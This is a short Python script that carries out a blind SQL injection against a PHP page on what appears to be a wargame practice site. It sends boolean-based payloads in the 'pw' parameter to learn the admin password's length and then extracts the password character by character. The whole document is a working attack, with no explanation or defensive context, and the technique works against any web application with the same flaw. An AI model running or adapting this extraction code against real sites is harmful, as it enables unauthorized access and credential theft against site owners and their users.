import requests as req
import string
s = req.session()
chrs = string.printable
cookies = {"PHPSESSID":""}
url = 'https://los.eagle-jump.org/orc.php'
#lens
len = 0
for i in xrange(100):
	print '[+] test len = %d' %i
	pay = "' or (id='admin' and length(pw) = %d)#"%i
	r = s.get(url,params={'pw':pay},cookies=cookies)
	if 'Hello admin' in r.text:
		print '[found] len = '+str(i)
		len = i
		break

pw = ''
for i in xrange(1,len+1):
	for j in chrs:
		pay = "' or (id='admin' and ord(substr(pw,%d,1)) = %d)#"%(i,ord(j))
		r = s.get(url,params={'pw':pay},cookies=cookies)
		if 'Hello admin' in r.text:
			pw += j
			print pw
			break
print '[found] pw = '+pw
